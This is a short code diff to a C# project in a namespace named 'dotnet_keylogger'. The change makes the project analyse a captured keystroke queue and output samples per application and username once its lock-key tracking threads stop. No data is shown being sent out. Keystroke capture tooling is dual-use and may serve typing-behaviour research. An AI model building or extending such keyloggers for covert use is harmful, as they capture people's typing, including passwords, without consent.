@@ -262,7 +262,14 @@ namespace dotnet_keylogger
             thread_capslock_track.Abort();
             thread_scrolllock_track.Abort();
             thread_numlock_track.Abort();
-            analyser a = new analyser(kQ);
+            analyser a = new analyser(kQ, "");
+            foreach (string application in a.getApps().Keys)
+                {
+                kQ.position = 0;
+                analyser b = new analyser(kQ, application);
+                int[] AggRange = { 4, };
+                b.OutputSamples(user:username, application:application, SampleAggs:AggRange);
+            }
             //Application.Exit();
         }
 
